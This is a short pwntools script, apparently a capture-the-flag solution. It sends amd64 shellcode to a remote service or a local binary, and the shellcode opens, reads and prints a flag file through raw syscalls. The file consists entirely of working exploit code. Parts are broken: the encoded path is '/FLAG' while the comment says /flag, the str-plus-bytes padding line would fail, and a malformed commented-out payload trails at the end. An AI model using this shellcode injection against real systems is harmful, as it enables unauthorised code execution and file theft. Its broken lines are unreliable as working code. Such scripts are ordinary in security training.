from pwn import *


def interact_with_process(binary_path, host=None, port=None):
    # Start the process
    if host and port:
        p = remote(host, port)
    else:
        p = process(binary_path)

    context.arch = 'amd64'

    # Shellcode to open /flag and read it
    shellcode = asm('''
               XOR RAX, RAX
               MOV RAX, 0x47414C462F
               PUSH RAX
               MOV RDI, RSP


               XOR RSI, RSI
               XOR RDX, RDX
               MOV RAX, 2
               SYSCALL

               MOV RDI, RAX
               MOV RSI, RSP
               MOV RDX, 200
               XOR RAX, RAX
               SYSCALL

               MOV RDI, 1
               MOV RSI, RSP
               MOV RDX, 200
               MOV RAX, 1
               SYSCALL

               XOR RDI, RDI
               MOV RAX, 60
               SYSCALL

           ''')

    print('shellcode:', shellcode)
    p.sendlineafter(b':', shellcode)
    p.interactive()


# Example usage
interact_with_process('', 'lmao.lol', 26246)
# interact_with_process('../w1/too-slow')

helloworld = "Hello world"
helloworld_full = helloworld + b"\0" * (8 - len(helloworld) % 8)
chunk1 = hex(u64(helloworld_full[0:8]))
chunk2 = hex(u64(helloworld_full[8:16]))

# payload = asm =(
#     f"""
#     # set rdi to fd
#     mov rdi, 1
#     # set rsi to buf
#     mov r8, chunk1
#     push r8
#
#     mov r8, chunk2
#     push r8
#
#     # push {chunk1}
#     # push {chunk2}
#
#     mov rsi, rsp
#
#     # set rdx to len(buf)
#     mov rdx, {len(helloworld)}
#
#
#     mov rax, SYS_write
#     syscall
#     """


# """
# mov rbx,30
# mov rcx , 17
# lea rax, [rbx*2+rcx]
# mov rax,[rax]

# cmp rax, 50

# """
# )
